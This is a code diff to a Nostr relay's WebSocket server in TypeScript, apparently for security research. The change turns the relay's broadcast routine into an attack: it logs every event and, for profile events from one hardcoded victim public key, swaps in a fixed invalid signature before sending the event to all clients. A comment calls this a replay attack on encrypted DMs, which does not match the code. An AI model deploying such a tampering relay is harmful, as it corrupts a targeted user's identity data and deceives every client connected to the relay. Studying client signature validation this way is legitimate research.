@@ -11,6 +11,9 @@ import { getRemoteAddress } from '../utils/http'
 import { isRateLimited } from '../handlers/request-handlers/rate-limiter-middleware'
 import { Settings } from '../@types/settings'
 import { WebServerAdapter } from './web-server-adapter'
+import {EventKinds} from "../constants/base";
+import {getEventHash, isEventMatchingFilter} from "../utils/event";
+import {createOutgoingEventMessage} from "../utils/messages";
 
 const debug = createLogger('web-socket-server-adapter')
 
@@ -70,16 +73,40 @@ export class WebSocketServerAdapter extends WebServerAdapter implements IWebSock
   }
 
   private onBroadcast(event: Event) {
-    this.webSocketServer.clients.forEach((webSocket: WebSocket) => {
-      if (!propEq('readyState', OPEN)(webSocket)) {
-        return
-      }
-      const webSocketAdapter = this.webSocketsAdapters.get(webSocket) as IWebSocketAdapter
-      if (!webSocketAdapter) {
-        return
-      }
-      webSocketAdapter.emit(WebSocketAdapterEvent.Event, event)
-    })
+    console.log('---------')
+    console.log('event')
+    console.log(event)
+    // do truncated replay attack on EncryptedDM
+    // eslint-disable-next-line max-len
+    // victim public key in hex string
+    // same as npub1ynert69p79kulwzujknnsllsvxp9rxquw3y2sjsgakq935etf4ksrj7sm4
+    const target_pub = '24f235e8a1f16dcfb85c95a7387ff0618251981c7448a84a08ed8058d32b4d6d'
+    if(event.kind==0 && event.pubkey==target_pub){
+      console.log('Replace sig with invalid sig on profile')
+      event.sig = 'd4a739b22f298cb04f69f0a9636a09d9e308eb17c4b884ae130db511cb92a9954e3048ff22dd5f10605e42f6a79bf208f368b86b877a98a68f73c15b4679c382'
+
+      this.webSocketServer.clients.forEach((webSocket: WebSocket) => {
+        if (!propEq('readyState', OPEN)(webSocket)) {
+          return
+        }
+        const webSocketAdapter = this.webSocketsAdapters.get(webSocket) as IWebSocketAdapter
+        if (!webSocketAdapter) {
+          return
+        }
+        webSocketAdapter.emit(WebSocketAdapterEvent.Event, event)
+      })
+    }else{
+      this.webSocketServer.clients.forEach((webSocket: WebSocket) => {
+        if (!propEq('readyState', OPEN)(webSocket)) {
+          return
+        }
+        const webSocketAdapter = this.webSocketsAdapters.get(webSocket) as IWebSocketAdapter
+        if (!webSocketAdapter) {
+          return
+        }
+        webSocketAdapter.emit(WebSocketAdapterEvent.Event, event)
+      })
+    }
   }
 
   public getConnectedClients(): number {
